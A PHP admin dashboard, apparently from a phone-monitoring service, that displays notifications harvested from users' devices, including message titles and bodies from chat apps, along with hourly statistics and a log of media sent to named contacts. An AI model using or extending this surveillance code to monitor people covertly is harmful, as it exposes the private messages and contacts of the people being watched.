<?php
require_once __DIR__ . '/_boot.php';
ss_require_owner();
$PAGE_TITLE = 'Notifications';
$PAGE_SUB   = 'Track incoming notifications across installed apps';
$PAGE_ICON  = '🔔';

// Rough category from app/package name.
function notif_cat($app) {
    $a = strtolower((string)$app);
    if (strpos($a,'whatsapp')!==false||strpos($a,'telegram')!==false||strpos($a,'messenger')!==false||strpos($a,'signal')!==false) return 'Chat';
    if (strpos($a,'instagram')!==false||strpos($a,'snapchat')!==false||strpos($a,'facebook')!==false||strpos($a,'twitter')!==false||strpos($a,'tiktok')!==false) return 'Social';
    if (strpos($a,'gmail')!==false||strpos($a,'mail')!==false||strpos($a,'outlook')!==false) return 'Email';
    if (strpos($a,'phone')!==false||strpos($a,'dialer')!==false||strpos($a,'call')!==false) return 'Calls';
    if (strpos($a,'amazon')!==false||strpos($a,'flipkart')!==false||strpos($a,'shop')!==false) return 'Shopping';
    return 'Others';
}

$uid = (int)($_GET['user'] ?? 0);
$users = $pdo->query("SELECT id, username, name FROM users WHERE role='user' ORDER BY name")->fetchAll();
$uw = $uid ? "AND n.user_id=$uid" : "";
// Optional "which day" filter for the log list (YYYY-MM-DD).
$day = (string)($_GET['day'] ?? '');
if ($day !== '' && !preg_match('/^\d{4}-\d{2}-\d{2}$/', $day)) $day = '';

$today = (int)$pdo->query("SELECT COUNT(*) FROM notification_events n WHERE DATE(posted_at)=CURDATE() $uw")->fetchColumn();
$week  = (int)$pdo->query("SELECT COUNT(*) FROM notification_events n WHERE posted_at>=DATE_SUB(CURDATE(),INTERVAL 6 DAY) $uw")->fetchColumn();
$activeDevices = (int)$pdo->query("SELECT COUNT(DISTINCT user_id) FROM notification_events WHERE posted_at>=DATE_SUB(CURDATE(),INTERVAL 1 DAY)")->fetchColumn();
$lastN = $pdo->query("SELECT MAX(posted_at) FROM notification_events n WHERE 1 $uw")->fetchColumn();

// Top apps
$topApps = $pdo->query("SELECT app_name, COUNT(*) c FROM notification_events n WHERE 1 $uw GROUP BY app_name ORDER BY c DESC LIMIT 8")->fetchAll();
$totalAll = (int)$pdo->query("SELECT COUNT(*) FROM notification_events n WHERE 1 $uw")->fetchColumn();
$mostApp = $topApps[0]['app_name'] ?? '—';
$maxC = $topApps ? max(array_column($topApps,'c')) : 1;

// Categories
$cats = ['Chat'=>0,'Social'=>0,'Email'=>0,'Calls'=>0,'Shopping'=>0,'Others'=>0];
foreach ($pdo->query("SELECT app_name, COUNT(*) c FROM notification_events n WHERE 1 $uw GROUP BY app_name")->fetchAll() as $r) {
    $cats[notif_cat($r['app_name'])] += (int)$r['c'];
}
$cats = array_filter($cats);

// Daily last 30
$dayRows = $pdo->query("SELECT DATE(posted_at) d, COUNT(*) c FROM notification_events n
                        WHERE posted_at>=DATE_SUB(CURDATE(),INTERVAL 29 DAY) $uw GROUP BY DATE(posted_at)")->fetchAll();
$dmap=[]; foreach($dayRows as $r) $dmap[$r['d']]=(int)$r['c'];
$dLabels=[];$dData=[]; for($i=29;$i>=0;$i--){$d=date('Y-m-d',strtotime("-$i days"));$dLabels[]=date('d M',strtotime($d));$dData[]=$dmap[$d]??0;}

// Per-hour today
$hourRows = $pdo->query("SELECT HOUR(posted_at) h, COUNT(*) c FROM notification_events n
                         WHERE DATE(posted_at)=CURDATE() $uw GROUP BY HOUR(posted_at)")->fetchAll();
$hmap2=[]; foreach($hourRows as $r) $hmap2[(int)$r['h']]=(int)$r['c'];
$hData=[]; for($h=0;$h<24;$h++) $hData[]=$hmap2[$h]??0;
$hLabels=[]; for($h=0;$h<24;$h++) $hLabels[]=($h%3==0)?(($h%12==0?12:$h%12).($h<12?'a':'p')):'';

// Analytics: peak/quiet hour (last 7 days), avg/day, distinct apps
$peakRows = $pdo->query("SELECT HOUR(posted_at) h, COUNT(*) c FROM notification_events n
                         WHERE posted_at>=DATE_SUB(NOW(),INTERVAL 7 DAY) $uw GROUP BY HOUR(posted_at) ORDER BY c DESC")->fetchAll();
$peakHour = $peakRows ? (int)$peakRows[0]['h'] : null;
$quietHour = $peakRows ? (int)$peakRows[count($peakRows)-1]['h'] : null;
$distinctApps = (int)$pdo->query("SELECT COUNT(DISTINCT app_name) FROM notification_events n WHERE 1 $uw")->fetchColumn();
$avgPerDay = round($week / 7, 1);
$hh = fn($h)=> $h===null?'—':(($h%12==0?12:$h%12).':00 '.($h<12?'AM':'PM'));

// Sync status
$lastHb = $pdo->query("SELECT MAX(last_seen) FROM device_status")->fetchColumn();
$notifSharers = (int)$pdo->query("SELECT COUNT(*) FROM tracking_settings WHERE share_notifs=1")->fetchColumn();

// Recent logs — filtered to a chosen day if one is picked, else the latest 60.
if ($day !== '') {
    $lg = $pdo->prepare("SELECT n.*, u.username FROM notification_events n JOIN users u ON u.id=n.user_id
                         WHERE DATE(n.posted_at)=? $uw ORDER BY n.id DESC LIMIT 500");
    $lg->execute([$day]);
    $logs = $lg->fetchAll();
} else {
    $logs = $pdo->query("SELECT n.*, u.username FROM notification_events n JOIN users u ON u.id=n.user_id
                         WHERE 1 $uw ORDER BY n.id DESC LIMIT 60")->fetchAll();
}

// Media send events (outgoing photos/videos caught from notifications)
$mediaSends = [];
$mediaSendStats = ['total' => 0, 'today' => 0, 'contacts' => []];
try {
    $msQ = $pdo->query("SELECT * FROM media_send_events WHERE 1 " . ($uid ? "AND user_id=$uid" : "") . " ORDER BY detected_at DESC LIMIT 100");
    $mediaSends = $msQ->fetchAll();
    $mediaSendStats['total'] = (int)$pdo->query("SELECT COUNT(*) FROM media_send_events WHERE 1 " . ($uid ? "AND user_id=$uid" : ""))->fetchColumn();
    $mediaSendStats['today'] = (int)$pdo->query("SELECT COUNT(*) FROM media_send_events WHERE DATE(detected_at)=CURDATE() " . ($uid ? "AND user_id=$uid" : ""))->fetchColumn();
    $topContacts = $pdo->query("SELECT contact_name, app_name, COUNT(*) c, MAX(detected_at) last_at FROM media_send_events WHERE 1 " . ($uid ? "AND user_id=$uid" : "") . " GROUP BY contact_name, app_name ORDER BY c DESC LIMIT 10")->fetchAll();
    $mediaSendStats['contacts'] = $topContacts;
} catch (\Throwable $e) {}

// CSV export
if (($_GET['export'] ?? '') === 'csv') {
    header('Content-Type: text/csv'); header('Content-Disposition: attachment; filename="notifications-'.date('Y-m-d').'.csv"');
    $out=fopen('php://output','w'); fputcsv($out,['Time','App','Category','Title','Message','User']);
    foreach($logs as $l) fputcsv($out,[$l['posted_at'],$l['app_name'],notif_cat($l['app_name']),$l['title'],$l['body'],$l['username']]);
    fclose($out); exit;
}

$PAGE_TOOLS = '<form method="get" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">'
            . '<select class="sel" name="user" onchange="this.form.submit()"><option value="0">All Users</option>';
foreach ($users as $u) $PAGE_TOOLS .= '<option value="'.(int)$u['id'].'" '.($uid===(int)$u['id']?'selected':'').'>'.ss_admin_h($u['name']).'</option>';
// Pick which day's notifications to view (blank = latest).
$PAGE_TOOLS .= '</select>'
            . '<input class="sel" type="date" name="day" value="'.ss_admin_h($day).'" max="'.date('Y-m-d').'" onchange="this.form.submit()">';
if ($day !== '') $PAGE_TOOLS .= '<a class="btn" href="?user='.$uid.'">✕ Clear</a>';
$PAGE_TOOLS .= '</form><a class="btn" href="?user='.$uid.($day!==''?'&day='.$day:'').'&export=csv">⬇ CSV</a>';

require __DIR__ . '/_dark_head.php';
?>
<div class="cards">
  <div class="stat"><div class="h"><span class="dot">🔔</span> Notifications · Today</div><div class="v"><?= number_format($today) ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📦</span> This Week</div><div class="v"><?= number_format($week) ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🏆</span> Most Active App</div><div class="v" style="font-size:1.2rem"><?= ss_admin_h($mostApp) ?></div><div class="d"><?= $totalAll?round(($topApps[0]['c']??0)/$totalAll*100):0 ?>%</div></div>
  <div class="stat"><div class="h"><span class="dot">📱</span> Active Devices</div><div class="v"><?= $activeDevices ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🕐</span> Last Notification</div><div class="v" style="font-size:1rem"><?= $lastN?date('d M, H:i',strtotime($lastN)):'—' ?></div></div>
</div>

<div class="grid g2">
  <div class="panel">
    <h3>Top Notification Apps</h3>
    <?php if(!$topApps): ?><div class="empty">No notification data yet.<br><span style="font-size:.8rem">Users must grant <b>Notification Access</b> in the app.</span></div>
    <?php else: foreach($topApps as $a): $pct=round($a['c']/$maxC*100); ?>
      <div class="barrow"><div class="nm"><?= ss_admin_h($a['app_name']) ?></div><div class="tr"><div class="bar" style="width:<?= $pct ?>%"></div></div><div class="vl"><?= (int)$a['c'] ?> · <?= $totalAll?round($a['c']/$totalAll*100):0 ?>%</div></div>
    <?php endforeach; endif; ?>
  </div>
  <div class="panel">
    <h3>Notification Categories</h3>
    <?php if(!$cats): ?><div class="empty">—</div><?php else: ?><canvas id="cat" height="220"></canvas><?php endif; ?>
  </div>
</div>

<div class="panel">
  <h3>Notifications Per Hour — Today</h3>
  <canvas id="hourly" height="80"></canvas>
</div>

<div class="cards">
  <div class="stat"><div class="h"><span class="dot">🔺</span> Peak Hour</div><div class="v" style="font-size:1.2rem"><?= $hh($peakHour) ?></div><div class="d"><?= $peakRows?(int)$peakRows[0]['c'].' notifs':'' ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🔻</span> Quietest Hour</div><div class="v" style="font-size:1.2rem"><?= $hh($quietHour) ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📊</span> Avg / Day</div><div class="v"><?= $avgPerDay ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📦</span> Apps Sending</div><div class="v"><?= $distinctApps ?></div></div>
</div>

<div class="grid g2">
  <div class="panel">
    <h3>Daily Notifications (Last 30 Days)</h3>
    <canvas id="daily" height="110"></canvas>
  </div>
  <div class="panel">
    <h3>Sync Status</h3>
    <table>
      <tr><th>Users sharing notifs</th><td><?= $notifSharers ?></td></tr>
      <tr><th>Active devices (24h)</th><td><?= $activeDevices ?></td></tr>
      <tr><th>Last notification</th><td><?= $lastN?date('d M, H:i',strtotime($lastN)):'—' ?></td></tr>
      <tr><th>Last heartbeat</th><td><?= $lastHb?date('d M, H:i',strtotime($lastHb)):'—' ?></td></tr>
      <tr><th>Total captured</th><td><?= number_format($totalAll) ?></td></tr>
      <tr><th>Listener</th><td><?= $lastN && strtotime($lastN)>time()-86400 ? '<span class="pill">Active</span>' : '<span class="pill" style="background:rgba(100,116,139,.15);color:#94a3b8">Idle</span>' ?></td></tr>
    </table>
  </div>
</div>

<div class="grid g2">
  <div class="panel">
    <h3>Notification Logs <?= $day!=='' ? '— '.ss_admin_h(date('d M Y', strtotime($day))).' <span style="font-size:.8rem;color:var(--mut)">('.count($logs).')</span>' : '<span style="font-size:.8rem;color:var(--mut)">(latest 60 — pick a date above)</span>' ?></h3>
    <?php if(!$logs): ?><div class="empty"><?= $day!=='' ? 'No notifications on this day.' : 'No notifications captured yet.' ?></div><?php else: ?>
    <div style="overflow-x:auto;max-height:420px;overflow-y:auto"><table>
      <thead><tr><th>Time</th><th>App</th><th>Category</th><th>Title / Message</th><th>User</th></tr></thead>
      <tbody>
      <?php foreach($logs as $l): ?>
        <tr>
          <td style="white-space:nowrap;color:var(--mut)"><?= date('d M H:i',strtotime($l['posted_at'])) ?></td>
          <td><b><?= ss_admin_h($l['app_name'] ?: '—') ?></b></td>
          <td><?= ss_admin_h(notif_cat($l['app_name'])) ?></td>
          <td><?= ss_admin_h($l['title'] ?: '') ?><?= $l['body']?'<br><span style="color:var(--mut);font-size:.76rem">'.ss_admin_h($l['body']).'</span>':'' ?></td>
          <td style="color:var(--mut)">@<?= ss_admin_h($l['username']) ?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table></div>
    <?php endif; ?>
  </div>
  <div class="panel">
    <h3>Notification Timeline (Live)</h3>
    <?php if(!$logs): ?><div class="empty">—</div><?php else: foreach(array_slice($logs,0,12) as $l): ?>
      <div style="display:flex;gap:10px;padding:8px 0;border-bottom:1px solid var(--line)">
        <div style="color:var(--mut);font-size:.72rem;width:52px"><?= date('H:i',strtotime($l['posted_at'])) ?></div>
        <div><b style="font-size:.82rem"><?= ss_admin_h($l['app_name'] ?: '—') ?></b><div style="color:var(--mut);font-size:.76rem"><?= ss_admin_h($l['title'] ?: ($l['body']?:'')) ?></div></div>
      </div>
    <?php endforeach; endif; ?>
  </div>
</div>

<!-- Media Sent Detection -->
<div class="panel" style="margin-top:18px">
  <h3>📤 Media Sent (Outgoing)</h3>
  <p style="color:var(--mut);font-size:.75rem;margin-bottom:12px">Detected when media is being sent via WhatsApp, Telegram, Instagram, etc.</p>
  <div class="cards" style="margin-bottom:14px">
    <div class="stat"><div class="h"><span class="dot">📤</span> Total Sends</div><div class="v"><?= $mediaSendStats['total'] ?></div></div>
    <div class="stat"><div class="h"><span class="dot">📅</span> Today</div><div class="v"><?= $mediaSendStats['today'] ?></div></div>
  </div>
  <?php if(!empty($mediaSendStats['contacts'])): ?>
  <h4 style="font-size:.85rem;color:var(--fg);margin:10px 0 6px">Top Contacts Receiving Media</h4>
  <div style="overflow-x:auto">
    <table style="width:100%;border-collapse:collapse;font-size:.78rem">
      <tr style="color:var(--mut);text-align:left;border-bottom:1px solid var(--line)">
        <th style="padding:6px">Contact</th><th style="padding:6px">App</th><th style="padding:6px">Count</th><th style="padding:6px">Last Sent</th>
      </tr>
      <?php foreach($mediaSendStats['contacts'] as $mc): ?>
      <tr style="border-bottom:1px solid var(--line)">
        <td style="padding:6px;font-weight:600"><?= ss_admin_h($mc['contact_name']) ?></td>
        <td style="padding:6px"><?= ss_admin_h($mc['app_name']) ?></td>
        <td style="padding:6px;color:#E8467C;font-weight:700"><?= $mc['c'] ?></td>
        <td style="padding:6px;color:var(--mut)"><?= date('d M H:i', strtotime($mc['last_at'])) ?></td>
      </tr>
      <?php endforeach; ?>
    </table>
  </div>
  <?php endif; ?>
  <?php if(!empty($mediaSends)): ?>
  <h4 style="font-size:.85rem;color:var(--fg);margin:14px 0 6px">Recent Media Sends</h4>
  <div style="max-height:400px;overflow-y:auto">
    <?php foreach(array_slice($mediaSends, 0, 30) as $ms): ?>
    <div style="display:flex;gap:10px;padding:8px 0;border-bottom:1px solid var(--line);align-items:center">
      <span style="font-size:20px;flex-shrink:0"><?= match($ms['media_type'] ?? '') {
          'photo' => '📷', 'video' => '🎥', 'audio' => '🎵', 'voice' => '🎙️', 'document' => '📄', 'gif' => '🎞️', default => '📤'
      } ?></span>
      <div style="flex:1;min-width:0">
        <div style="font-size:.82rem;font-weight:600"><?= ss_admin_h($ms['contact_name']) ?></div>
        <div style="font-size:.7rem;color:var(--mut)"><?= ss_admin_h($ms['app_name']) ?> · <?= ss_admin_h($ms['media_type'] ?? 'media') ?></div>
      </div>
      <div style="color:var(--mut);font-size:.7rem;flex-shrink:0"><?= date('d M H:i', strtotime($ms['detected_at'])) ?></div>
    </div>
    <?php endforeach; ?>
  </div>
  <?php else: ?>
  <div class="empty" style="color:var(--mut);padding:20px;text-align:center">No media sends detected yet</div>
  <?php endif; ?>
</div>

<script>
Chart.defaults.color='#8592ad'; Chart.defaults.borderColor='#1e2740'; Chart.defaults.font.family='Inter';
<?php if($cats): ?>
new Chart(document.getElementById('cat'),{type:'doughnut',
  data:{labels:<?= json_encode(array_keys($cats)) ?>,datasets:[{data:<?= json_encode(array_values($cats)) ?>,
    backgroundColor:['#ec4899','#a855f7','#6366f1','#f59e0b','#22c55e','#64748b'],borderWidth:0}]},
  options:{plugins:{legend:{position:'right',labels:{boxWidth:10,font:{size:11}}}},cutout:'62%'}});
<?php endif; ?>
new Chart(document.getElementById('hourly'),{type:'line',
  data:{labels:<?= json_encode($hLabels) ?>,datasets:[{data:<?= json_encode($hData) ?>,
    borderColor:'#ec4899',backgroundColor:'rgba(236,72,153,.15)',fill:true,tension:.35,pointRadius:0}]},
  options:{plugins:{legend:{display:false}},scales:{y:{beginAtZero:true,grid:{color:'#1e2740'}},x:{grid:{display:false}}}}});
new Chart(document.getElementById('daily'),{type:'line',
  data:{labels:<?= json_encode($dLabels) ?>,datasets:[{data:<?= json_encode($dData) ?>,
    borderColor:'#a855f7',backgroundColor:'rgba(168,85,247,.15)',fill:true,tension:.4,pointRadius:0}]},
  options:{plugins:{legend:{display:false}},scales:{y:{beginAtZero:true,grid:{color:'#1e2740'}},x:{grid:{display:false},ticks:{maxTicksLimit:8}}}}});
</script>
<?php require __DIR__ . '/_dark_foot.php';
